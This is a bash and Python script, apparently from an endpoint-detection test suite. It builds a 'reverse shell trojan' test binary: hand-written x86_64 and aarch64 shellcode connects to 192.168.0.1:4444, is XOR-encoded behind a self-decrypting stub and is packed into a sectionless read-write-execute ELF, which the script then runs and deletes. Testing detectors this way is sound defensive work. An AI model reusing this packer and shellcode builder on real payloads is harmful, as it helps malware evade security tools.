#!/bin/bash
# 15 - Reverse Shell Trojan (obfuscated ELF)
# Trigger: LapsangSensorDetect-High (ML)
# Tactic: Machine Learning / Cloud-based ML
set -e
echo "=== [15] Reverse Shell Trojan (ELF) ==="

# Build a self-decrypting, XOR-encoded, sectionless ELF binary using the same
# technique as the CrowdStrike detection-container. This triggers ML detection
# because it looks like packed malware (RWE segment, no sections, raw syscalls).

python3 << 'PYEOF'
import struct, os

XOR_KEY = 0xA7C35D1F

def xor_encode(payload, key):
    encoded = bytearray()
    k = key
    for i in range(0, len(payload), 4):
        dword = struct.unpack_from('<I', payload, i)[0]
        enc = dword ^ k
        encoded += struct.pack('<I', enc)
        k = (k + dword) & 0xFFFFFFFF
    return bytes(encoded)

import platform
if platform.machine() in ("x86_64", "amd64"):
    # x86_64 payload: socket/connect/close/exit via syscall instruction
    # NR_socket=41, NR_connect=42, NR_close=3, NR_exit=60
    payload = bytearray()
    # socket(AF_INET=2, SOCK_STREAM=1, 0)
    payload += b'\x48\x31\xf6'          # xor rsi, rsi
    payload += b'\x6a\x02'              # push 2
    payload += b'\x5f'                  # pop rdi (AF_INET)
    payload += b'\x6a\x01'              # push 1
    payload += b'\x5e'                  # pop rsi (SOCK_STREAM)
    payload += b'\x48\x31\xd2'          # xor rdx, rdx
    payload += b'\x6a\x29'              # push 41
    payload += b'\x58'                  # pop rax (NR_socket)
    payload += b'\x0f\x05'              # syscall
    payload += b'\x48\x89\xc6'          # mov rsi, rax (save fd)

    # Build sockaddr_in on stack: {AF_INET, port 4444, 192.168.0.1}
    payload += b'\x48\x31\xc0'          # xor rax, rax
    payload += b'\x50'                  # push rax (padding)
    payload += b'\x68\xc0\xa8\x00\x01'  # push 0x0100a8c0 (192.168.0.1)
    payload += b'\x66\x68\x11\x5c'      # push word 0x5c11 (port 4444 net order)
    payload += b'\x66\x6a\x02'          # push word 2 (AF_INET)

    # connect(fd, &sockaddr, 16)
    payload += b'\x48\x89\xf7'          # mov rdi, rsi (fd)
    payload += b'\x48\x89\xe6'          # mov rsi, rsp (addr)
    payload += b'\x6a\x10'              # push 16
    payload += b'\x5a'                  # pop rdx (addrlen)
    payload += b'\x6a\x2a'              # push 42
    payload += b'\x58'                  # pop rax (NR_connect)
    payload += b'\x0f\x05'              # syscall

    # close(fd)
    payload += b'\x48\x89\xf7'          # mov rdi, rsi (fd)
    payload += b'\x6a\x03'              # push 3
    payload += b'\x58'                  # pop rax (NR_close)
    payload += b'\x0f\x05'              # syscall

    # exit(0)
    payload += b'\x48\x31\xff'          # xor rdi, rdi
    payload += b'\x6a\x3c'              # push 60
    payload += b'\x58'                  # pop rax (NR_exit)
    payload += b'\x0f\x05'              # syscall

    while len(payload) % 4 != 0:
        payload += b'\x90'
    payload = bytes(payload)

    encoded = xor_encode(payload, XOR_KEY)
    ndwords = len(payload) // 4

    # Decoder stub for x86_64 (lea-based, no call/pop needed)
    stub = bytearray()
    # mov ebx, XOR_KEY
    stub += b'\xbb' + struct.pack('<I', XOR_KEY)
    # mov ecx, ndwords
    stub += b'\xb9' + struct.pack('<I', ndwords)
    # call $+5 / pop rsi (get RIP)
    stub += b'\xe8\x00\x00\x00\x00'
    stub += b'\x5e'
    # add rsi, remaining_stub_size (20 bytes after pop)
    stub += b'\x48\x81\xc6' + struct.pack('<I', 21)
    # decode loop:
    stub += b'\x8b\x06'              # mov eax, [rsi]
    stub += b'\x31\xd8'              # xor eax, ebx
    stub += b'\x89\x06'              # mov [rsi], eax
    stub += b'\x01\xc3'              # add ebx, eax
    stub += b'\x48\x83\xc6\x04'     # add rsi, 4
    stub += b'\xff\xc9'              # dec ecx
    stub += b'\x75\xf1'              # jnz loop
    code = bytes(stub) + encoded

    # ELF64 with single RWE segment, no sections
    EH = 64; PH = 56
    load_addr = 0x400000
    entry = load_addr + EH + PH
    filesz = EH + PH + len(code)
    memsz = filesz + 128

    elf_header = struct.pack('<4sBBBBB7xHHIQQQIHHHHHH',
        b'\x7fELF', 2, 1, 1, 0, 0, 2, 0x3E, 1, entry, EH, 0, 0, EH, PH, 1, 0, 0, 0)
    phdr = struct.pack('<IIQQQQQQ', 1, 7, 0, load_addr, load_addr, filesz, memsz, 0x10000)
    elf = elf_header + phdr + code

else:
    # aarch64 payload: socket/connect/close/exit via svc #0
    def insn(*args):
        return b''.join(struct.pack('<I', x) for x in args)

    payload = bytearray()
    # socket(2, 1, 0)
    payload += insn(0xD2800040, 0xD2800021, 0xD2800002, 0xD2800C68, 0xD4000001)
    # save fd
    payload += insn(0xAA0003E6)
    # sub sp, sp, 16
    payload += insn(0xD10043FF)
    # store sockaddr_in
    payload += insn(0x528B8801, 0x72A00041, 0xB90003E1)  # family+port
    payload += insn(0x52800021, 0x72B50001, 0xB90007E1)  # 192.168.0.1
    payload += insn(0xF900073F)  # sin_zero
    # connect(fd, sp, 16)
    payload += insn(0xAA0603E0, 0x910003E1, 0xD2800202, 0xD2801968, 0xD4000001)
    # close
    payload += insn(0xAA0603E0, 0xD2800728, 0xD4000001)
    # restore sp
    payload += insn(0x910043FF)
    # exit(0)
    payload += insn(0xD2800000, 0xD2800BA8, 0xD4000001)
    payload = bytes(payload)
    while len(payload) % 4 != 0:
        payload += b'\x00'

    encoded = xor_encode(payload, XOR_KEY)
    ndwords = len(payload) // 4

    # Decoder stub with cache maintenance
    stub_insns = []
    # ADR x0, payload_offset (will be 96 bytes = 24 insns)
    stub_insns.append(0x10000300)  # ADR X0, +96
    stub_insns.append(0x52800001 | ((XOR_KEY & 0xFFFF) << 5))
    stub_insns.append(0x72A00001 | (((XOR_KEY >> 16) & 0xFFFF) << 5))
    stub_insns.append(0x52800002 | ((ndwords & 0xFFFF) << 5))
    stub_insns.append(0xAA0003E4)  # MOV X4, X0 (save start)
    # decode loop
    stub_insns.append(0xB9400003)  # LDR W3, [X0]
    stub_insns.append(0x4A010063)  # EOR W3, W3, W1
    stub_insns.append(0xB8004403)  # STR W3, [X0], #4
    stub_insns.append(0x0B030021)  # ADD W1, W1, W3
    stub_insns.append(0x71000442)  # SUBS W2, W2, #1
    stub_insns.append(0x35FFFF42)  # CBNZ W2, -5*4
    # cache maintenance
    stub_insns.append(0xD50B7B24)  # DC CVAU, X4
    stub_insns.append(0x91010085)  # ADD X5, X4, #64
    stub_insns.append(0xD50B7B25)  # DC CVAU, X5
    stub_insns.append(0x910100A5)  # ADD X5, X5, #64
    stub_insns.append(0xD50B7B25)  # DC CVAU, X5
    stub_insns.append(0xD5033B9F)  # DSB ISH
    stub_insns.append(0xD50B7524)  # IC IVAU, X4
    stub_insns.append(0x91010085)  # ADD X5, X4, #64
    stub_insns.append(0xD50B7525)  # IC IVAU, X5
    stub_insns.append(0x910100A5)  # ADD X5, X5, #64
    stub_insns.append(0xD50B7525)  # IC IVAU, X5
    stub_insns.append(0xD5033B9F)  # DSB ISH
    stub_insns.append(0xD5033FDF)  # ISB

    stub = b''.join(struct.pack('<I', i) for i in stub_insns)
    code = stub + encoded

    # ELF64 with single RWE segment
    EH = 64; PH = 56
    load_addr = 0x400000
    entry = load_addr + EH + PH
    filesz = EH + PH + len(code)
    memsz = filesz + 128

    elf_header = struct.pack('<4sBBBBB7xHHIQQQIHHHHHH',
        b'\x7fELF', 2, 1, 1, 0, 0, 2, 0xB7, 1, entry, EH, 0, 0, EH, PH, 1, 0, 0, 0)
    phdr = struct.pack('<IIQQQQQQ', 1, 7, 0, load_addr, load_addr, filesz, memsz, 0x10000)
    elf = elf_header + phdr + code

with open("/tmp/trojan_test", "wb") as f:
    f.write(elf)
os.chmod("/tmp/trojan_test", 0o755)
print(f"  Built obfuscated ELF: {len(elf)} bytes")
PYEOF

# Execute (will try to connect to 192.168.0.1:4444, fail, then exit)
/tmp/trojan_test 2>/dev/null || true

# Cleanup
rm -f /tmp/trojan_test 2>/dev/null || true

echo "[15] Done — LapsangSensorDetect-High IOA should trigger"
